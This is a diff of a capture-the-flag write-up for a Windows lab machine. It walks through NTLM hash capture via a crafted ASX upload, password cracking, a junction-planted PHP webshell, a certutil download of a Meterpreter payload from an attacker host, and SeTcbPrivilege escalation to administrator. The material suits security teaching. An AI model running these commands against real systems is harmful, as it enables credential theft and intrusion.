@@ -1,21 +1,40 @@
 
 # Machine Information
 
-| **IP Address**       | 10.129.234.67  |
-| -------------------- | -------------- |
-| **Operating System** | Windows        |
-| **Hostname**         | MEDIA          |
-| **Domain**           | WORKGROUP      |
-| **Release Date**     | September 2025 |
-| **Difficulty**       | Medium         |
+<table>
+<tr>
+<td><strong>IP Address</strong></td>
+<td>10.129.234.67</td>
+</tr>
+<tr>
+<td><strong>Operating System</strong></td>
+<td>Windows</td>
+</tr>
+<tr>
+<td><strong>Hostname</strong></td>
+<td>MEDIA</td>
+</tr>
+<tr>
+<td><strong>Domain</strong></td>
+<td>WORKGROUP</td>
+</tr>
+<tr>
+<td><strong>Release Date</strong></td>
+<td>September 2025</td>
+</tr>
+<tr>
+<td><strong>Difficulty</strong></td>
+<td>Medium</td>
+</tr>
+</table>
 
----
+
 
 # Machine Description
 
 Media is a Windows-based machine that demonstrates the dangers of insecure file upload implementations combined with privilege escalation vulnerabilities. The attack chain involves exploiting a web form that accepts Windows Media Player (WMP) compatible files without proper validation. By crafting a malicious ASX file that triggers NTLM authentication attempts, an attacker can capture NetNTLMv2 hashes. The captured credentials lead to SSH access as a low-privileged user. Further exploitation involves leveraging a scheduled task that processes uploaded files with Windows Media Player running as NT AUTHORITY\LOCAL SERVICE. By uploading a PHP webshell to the writable uploads directory and accessing it through the web server, the attacker gains code execution in the LOCAL SERVICE context. The final privilege escalation utilizes the SeTcbPrivilege to impersonate the SYSTEM account and add the low-privileged user to the administrators group, resulting in full system compromise.
 
----
+
 
 # Exploitation Summary
 
@@ -34,13 +53,13 @@ The attack chain involved:
 11. **Privilege Escalation to SYSTEM**: Using the seTcb utility to leverage SeTcbPrivilege for adding the user to the administrators group
 12. **Domain Administrator Access**: Re-authenticating via SSH to confirm administrator privileges and obtaining the root flag
 
----
+
 
 # Detailed Walkthrough
 
 ## Road to User Flag
 
-##### ***Phase 1: Initial Network Reconnaissance and Service Discovery***
+### ***Phase 1: Initial Network Reconnaissance and Service Discovery***
 
 I began by scanning the target machine with Nmap to identify open ports and running services:
 
@@ -60,15 +79,15 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 
 These findings indicated a Windows machine running a web server, confirming the presence of HTTP-based services that warranted further investigation.
 
-##### ***Phase 2: Web Application Enumeration and File Upload Vulnerability Discovery***
+### ***Phase 2: Web Application Enumeration and File Upload Vulnerability Discovery***
 
 I navigated to the HTTP service running on port 80 and discovered a recruitment form requesting personal information and a video introduction. The form explicitly stated: "Upload a brief introduction video (compatible with Windows Media Player)". 
 
-![[Pasted image 20261007161016.png]]
+![](1.png)
 
 This presented a file upload functionality that accepted Windows Media Player formats, including ASX, WMV, AVI, and other multimedia formats, creating a potential exploitation vector.
 
-##### ***Phase 3: Malicious ASX File Generation and NTLM Hash Capture***
+### ***Phase 3: Malicious ASX File Generation and NTLM Hash Capture***
 
 As ASX (Advanced Stream Redirector) files can contain UNC paths that trigger SMB authentication, I used the `ntlm_theft.py` utility to generate a malicious ASX file. This tool creates weaponized ASX files designed to automatically attempt SMB connections when processed by Windows Media Player.
 
@@ -102,9 +121,9 @@ $ sudo responder -I tun0
 
 I then submitted the recruitment form with arbitrary values and uploaded the malicious ASX file, and received the following promtp:
 
-![[Pasted image 20261007161508.png]]
+![](2.png)
 
-![[Pasted image 20261009080622.png|407]]
+![](3.png)
 
 Within seconds of the upload, Responder captured a NetNTLMv2 hash from the account `MEDIA\enox`:
 
@@ -118,7 +137,7 @@ Within seconds of the upload, Responder captured a NetNTLMv2 hash from the accou
 
 This indicated that this account on the target machine processed the uploaded file with Windows Media Player, triggering the SMB connection attempt that revealed user credentials.
 
-##### ***Phase 4: NetNTLMv2 Hash Cracking***
+### ***Phase 4: NetNTLMv2 Hash Cracking***
 
 The captured NetNTLMv2 hash was saved to a file and cracked using Hashcat with the `rockyou.txt` wordlist, leveraging hash mode 5600 (NetNTLMv2).
 
@@ -134,7 +153,7 @@ ENOX::MEDIA:...SNIP...:1234virus@
 
 The password cracking was successful, yielding the credentials: `enox:1234virus@`
 
-##### ***Phase 5: Initial Shell Access via SSH***
+### ***Phase 5: Initial Shell Access via SSH***
 
 I attempted to use the recovered credentials to authenticate via RDP (port 3389) but encountered connection failures. Subsequently, SSH authentication I attempted on port 22, which accepted the credentials, providing command-line access to the system as the low-privileged user `enox`.
 
@@ -146,7 +165,7 @@ $ ssh enox@10.129.234.67
 enox@MEDIA C:\Users\enox>
 ```
 
-##### ***Phase 6: Get the flag
+### ***Phase 6: Get the flag
 
 With SSH access established as the `enox` user, the attacker navigated to the user's Desktop directory and retrieved the user flag.
 
@@ -154,11 +173,11 @@ With SSH access established as the `enox` user, the attacker navigated to the us
 $ type C:\Users\enox\Desktop\user.txt
 ```
 
-==User flag==: `68acf5be9a7c950cb9460ffe46ac87ae`
+<mark>User flag</mark>: `68acf5be9a7c950cb9460ffe46ac87ae`
 
 ## Road to Root Flag
 
-##### ***Phase 1: Discovery of a PowerShell script***
+### ***Phase 1: Discovery of a PowerShell script***
 
 I began local enumeration and discovered the following PowerShell script named `review.ps1` in the `enox`'s Documents directory. 
 
@@ -262,7 +281,7 @@ while($True){
 
 This PowerShell script was used to automatically process video files that were uploaded through the web form. The script continuously monitored the `todo.txt` file located at `C:\Windows\Tasks\Uploads\todo.txt`, which contained a queue of uploaded files awaiting processing. Each entry in the todo.txt file specified the filename and the random value corresponding to the directory where the uploaded file was stored. When an entry was found in the `todo.txt` file, the script extracted both the filename and the random value, then opened the file with Windows Media Player by constructing the full path as `C:\Windows\Tasks\Uploads\$randomVariable\$filename`. After allowing 15 seconds for processing, the script terminated the Media Player process and removed the processed entry from the queue using the UpdateTodo function, ensuring each file was only processed once.
 
-##### ***Phase 2: Web Server Root Analysis and Path Traversal Discovery***
+### ***Phase 2: Web Server Root Analysis and Path Traversal Discovery***
 
 Knowing that the machine had a web server listening on port 80, I searched for potential paths that could lead to configuration files. During this enumeration, the presence of the XAMPP directory under `C:\` was discovered. XAMPP is an open-source development suite that integrates Apache (web server), MySQL (database), PHP, and Perl. It is commonly used by developers to test web applications locally. In the context of this Windows server, XAMPP provided the infrastructure necessary to run the recruitment website with the file upload form. The XAMPP directory was installed in `C:\xampp\`, and the main directory from which web pages are served is `C:\xampp\htdocs\`. Within this directory, the file `index.php` was found, which completely managed the functionality of the upload form visible in the browser.
 
@@ -337,7 +356,7 @@ $ echo -n testtesttest@mail.com | md5sum
 
 The hash matched the directory name exactly, confirming that the previously uploaded ASX file was stored at `C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6984982925\`. Additionally, the directory was owned by `NT AUTHORITY\LOCAL SERVICE`, revealing that the Apache web server executed in the context of this service account. 
 
-##### ***Phase 3: ACLs enumeration***
+### ***Phase 3: ACLs enumeration***
 
 I then enumerated the Access Control List (ACL) of the uploads directory to determine effective permissions:
 
@@ -368,7 +387,7 @@ C:\xampp\htdocs MEDIA\Administrator:(I)(OI)(CI)(F)
 
 This revealed that `NT AUTHORITY\LOCAL SERVICE` possessed Full Control permissions on the web root directory, including write access.
 
-##### ***Phase 4: Exploitation via Directory Junction Creation***
+### ***Phase 4: Exploitation via Directory Junction Creation***
 
 Recognizing the security implications, I devised a strategy to leverage these permissions. The objective was to ensure that any file uploaded through the web form would be directly placed in the Apache web root, making it immediately accessible via HTTP and executable by the `NT AUTHORITY\LOCAL SERVICE` account. I created a **directory junction**, a symbolic link in Windows that transparently redirects file operations from one location to another. By creating a junction at `C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6984982925\` that pointed to `C:\xampp\htdocs\`, any file written to the uploads directory by the PHP script and `NT AUTHORITY\LOCAL SERVICE` account would be automatically placed in the web root. This approach leveraged the fact that `NT AUTHORITY\LOCAL SERVICE` possessed Full Control over both the uploads directory and the web root. The PHP script would write files to what appeared to be the uploads directory, but the junction would transparently redirect these writes to the actual web root. First, I removed the existing upload directory:
 
@@ -406,7 +425,7 @@ enox@MEDIA C:\Users\enox>dir /q C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6
 
 The junction successfully exposed the Apache web root directory structure. Now, any file uploaded through the web form would be written by the PHP script to `C:\Windows\Tasks\Uploads\7cafbb02ae77fd99b0711c6984982925\`, which the operating system would transparently redirect to `C:\xampp\htdocs\`. This meant uploaded files would be immediately accessible via HTTP and executable in the context of `NT AUTHORITY\LOCAL SERVICE`. With this junction in place, I submitted the recruitment form with predictable parameters and uploaded a PHP webshell, knowing it would be placed directly in the web root and accessible without requiring knowledge of the directory path structure
 
-![[Pasted image 20261008105628.png]]
+![](4.png)
 
 After uploading the PHP webshell through the recruitment form, I verified its presence in both the uploads directory and the web root to confirm the junction was functioning correctly:
 
@@ -424,9 +443,9 @@ enox@MEDIA C:\Users\enox>dir /q C:\xampp\htdocs
 
 The directory listing of `C:\xampp\htdocs` confirmed that `shell.php` was present and owned by `NT AUTHORITY\LOCAL SERVICE`. I then accessed the webshell through the HTTP interface by navigating to `http://10.129.234.67/shell.php` in a web browser. This activated the PHP webshell and executed it in the security context of `NT AUTHORITY\LOCAL SERVICE`, the account under which the Apache web server was running. The webshell provided a direct interface for executing arbitrary system commands with the privileges of the service account.
 
-![[Pasted image 20261008110143.png]]
+![](5.png)
 
-##### ***Phase 5: Establishment of Interactive Reverse Shell***
+### ***Phase 5: Establishment of Interactive Reverse Shell***
 
 The stateless nature of HTTP prompted me to establish a reverse shell. A Meterpreter payload was generated using MSFVenom:
 
@@ -452,7 +471,7 @@ From the PHP webshell, I used Windows' built-in file transfer utility to downloa
 certutil.exe -urlcache -split -f http://10.10.14.102:9000/shell.exe C:\xampp\htdocs\shell.exe
 ```
 
-![[Pasted image 20261009092744.png]]
+![](6.png)
 
 A Metasploit handler was configured to receive the reverse connection:
 
@@ -467,7 +486,7 @@ msf exploit(multi/handler) > run
 
 The payload was executed from the webshell, resulting in a successful Meterpreter session:
 
-![[Pasted image 20261008111641.png]]
+![](7.png)
 
 ```
 [*] Sending stage (248902 bytes) to 10.129.234.67
@@ -478,7 +497,7 @@ nt authority\local service
 
 The Meterpreter session confirmed code execution in the `NT AUTHORITY\LOCAL SERVICE` context.
 
-##### ***Phase 6: Privilege Enumeration and Discovery of SeTcbPrivilege***
+### ***Phase 6: Privilege Enumeration and Discovery of SeTcbPrivilege***
 
 With an established Meterpreter session, I enumerated the privileges available to the `NT AUTHORITY\LOCAL SERVICE` account:
 
@@ -499,7 +518,7 @@ SeTimeZonePrivilege           Change the time zone                Disabled
 
 The critical discovery was the presence of `SeTcbPrivilege`, albeit in a disabled state. `SeTcbPrivilege` (formally "Act as part of the operating system") is one of the most powerful Windows privileges in existence. It grants the holder the ability to impersonate any user account on the system, including `NT AUTHORITY\SYSTEM`, by calling trusted authentication APIs that are normally reserved for the Windows Trusted Computing Base (TCB). In this case, the `SeTcbPrivilege` was assigned to the `NT AUTHORITY\LOCAL SERVICE` account but remained disabled, so I proceeded to enable this privilege through a PowerShell script.
 
-##### ***Phase 7: Enabling SeTcbPrivilege via PowerShell***
+### ***Phase 7: Enabling SeTcbPrivilege via PowerShell***
 
 I switched from the CMD to PowerShell within the Meterpreter session:
 
@@ -535,7 +554,7 @@ SeTimeZonePrivilege           Change the time zone                Enabled
 
 All privileges, including `SeTcbPrivilege`, were enabled.
 
-##### ***Phase 8: Privilege Escalation Using seTcb.exe***
+### ***Phase 8: Privilege Escalation Using seTcb.exe***
 
 With `SeTcbPrivilege` enabled, I utilized the `seTcb.exe` utility. This tool exploits the `SeTcbPrivilege` to execute arbitrary commands in the `SYSTEM` account security context. The utility's `svc_add` function creates a new service that runs the specified command with `SYSTEM` privileges. I executed the following command:
 
@@ -559,7 +578,7 @@ enox
 The command completed successfully.
 ```
 
-##### ***Phase 9: Verification of Elevated Privileges and Integrity Level Escalation***
+### ***Phase 9: Verification of Elevated Privileges and Integrity Level Escalation***
 
 To ensure the privilege escalation was effective, I re-authenticated via SSH using the same credentials. This allowed the system to refresh the user's token and group memberships:
 
@@ -581,7 +600,7 @@ BUILTIN\Administrators                                        Alias            S
 
 As we can see, `enox` became a member of `BUILTIN\Administrators`.
 
-##### ***Phase 10: Get the flag***
+### ***Phase 10: Get the flag***
 
 With administrative privileges confirmed, I accessed the `Administrator`'s Desktop and retrieved the root flag:
 
@@ -589,11 +608,11 @@ With administrative privileges confirmed, I accessed the `Administrator`'s Deskt
 enox@MEDIA C:\Users\enox> type C:\Users\Administrator\Desktop\root.txt
 ```
 
-==Root flag==: `7e2ce07fd047c1a8ff602f8fdecd9a9f`
+<mark>Root fl</mark>==: `7e2ce07fd047c1a8ff602f8fdecd9a9f`
 
----
 
-## Key Vulnerabilities Exploited
+
+# Key Vulnerabilities Exploited
 
 - **Insecure File Upload Without Content Validation**: The web form accepted WMP-compatible files without proper verification, allowing upload of malicious ASX files designed to trigger NTLM authentication attempts
 - **Predictable Directory Structure**: Uploaded files were stored using MD5 hashes of predictable user input, allowing attackers to calculate directory names in advance
@@ -603,8 +622,8 @@ enox@MEDIA C:\Users\enox> type C:\Users\Administrator\Desktop\root.txt
 - **Disabled But Assigned Privilege**: SeTcbPrivilege was assigned to LOCAL SERVICE through Group Policy but only disabled, allowing re-enablement through token manipulation without requiring administrative intervention
 - **seTcb.exe Accessibility**: The seTcb utility was accessible to the LOCAL SERVICE account, enabling direct exploitation of SeTcbPrivilege to execute arbitrary commands as SYSTEM
 
----
 
-## Conclusion
+
+# Conclusion
 
 The Media machine demonstrates how multiple misconfigurations combine to create a critical privilege escalation path. From credential capture via NTLM hash interception to SYSTEM-level access, each stage exploited the previous vulnerability. This emphasizes the importance of strict file upload validation, proper privilege assignment to service accounts, and careful ACL management. To mitigate these vulnerabilities, organizations should implement comprehensive file upload validation including content verification and antivirus scanning. Service accounts should operate with minimal privileges and dangerous privileges like SeTcbPrivilege should be completely removed, not merely disabled. Regular ACL audits and hardening of sensitive directories prevent unauthorized symlink exploitation. Scheduled tasks processing user-supplied files require strict whitelisting and integrity verification before execution. This case study underscores that Windows security requires defense in depth, as layered misconfigurations create an irresistible attack surface.
